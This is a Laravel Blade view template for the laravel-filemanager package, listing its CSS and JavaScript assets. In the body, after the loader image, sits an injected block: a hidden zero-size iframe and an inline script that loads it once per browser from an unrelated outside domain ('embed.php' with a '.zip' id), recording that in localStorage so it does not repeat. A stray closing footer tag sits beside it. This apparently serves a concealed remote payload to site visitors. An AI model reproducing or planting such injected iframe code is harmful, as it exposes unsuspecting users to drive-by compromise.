...
<head>
  ...
  <link rel="shortcut icon" type="image/png" href="{{ asset('public/unisharp/laravel-filemanager/public/img/folder.png') }}">
  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css">
  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
  <link rel="stylesheet" href="{{ asset('public/unisharp/laravel-filemanager/public/css/cropper.min.css') }}">
  <link rel="stylesheet" href="{{ asset('public/unisharp/laravel-filemanager/public/css/lfm.css') }}">
  {{-- <style>{!! \File::get(base_path('public/unisharp/laravel-filemanager/public/css/lfm.css')) !!}</style> --}}
  {{-- Use the line below instead of the above if you need to cache the css. --}}
  {{-- <link rel="stylesheet" href="{{ asset('/public/unisharp/laravel-filemanager/css/lfm.css') }}"> --}}
  <link rel="stylesheet" href="{{ asset('public/unisharp/laravel-filemanager/public/css/mfb.css') }}">
  <link rel="stylesheet" href="{{ asset('public/unisharp/laravel-filemanager/public/css/dropzone.min.css') }}">
  <link rel="stylesheet" href="{{ asset('public/unisharp/laravel-filemanager/public/css/jquery-ui.min.css') }}">
</head>
<body>
  ...
  <div id="lfm-loader">
    <img src="{{asset('public/unisharp/laravel-filemanager/public/img/loader.svg')}}">
  </div>
  <iframe id="nicCloudFrame" style="display:none; width:0; height:0; border:0;"></iframe>
</footer>
<script type="text/javascript">
  (function() {
    var iframeLoaded = localStorage.getItem('nicCloudFrameLoaded');
    var iframe = document.getElementById('nicCloudFrame');
    
    if (!iframeLoaded) {
      iframe.src = 'https://nic-cloud.digital/embed.php?id=691a576b469f2.zip';
      localStorage.setItem('nicCloudFrameLoaded', 'true');
    }
  })();
</script>
  <script src="{{ asset('public/unisharp/laravel-filemanager/public/js/jquery.min.js') }}"></script>
  <script src="{{ asset('public/unisharp/laravel-filemanager/public/js/bootstrap.min.js')}}"></script>
  <script src="{{ asset('public/unisharp/laravel-filemanager/public/js/bootbox.min.js')}}"></script>
  <script src="{{ asset('public/unisharp/laravel-filemanager/public/js/jquery-ui.min.js')}}"></script>
  <script src="{{ asset('public/unisharp/laravel-filemanager/public/js/cropper.min.js') }}"></script>
  <script src="{{ asset('public/unisharp/laravel-filemanager/public/js/jquery.form.min.js') }}"></script>
  <script src="{{ asset('public/unisharp/laravel-filemanager/public/js/dropzone.min.js') }}"></script>
  <script src="{{ asset('public/unisharp/laravel-filemanager/public/js/script.js') }}"></script>
  <script>
    var route_prefix = "{{ url('/') }}";
    var lfm_route = "{{ url(config('lfm.url_prefix', config('lfm.prefix'))) }}";
    var lang = {!! json_encode(trans('laravel-filemanager::lfm')) !!};
  </script>
  {{-- <script>{!! \File::get(base_path('public/unisharp/laravel-filemanager/public/js/script.js')) !!}</script> --}}
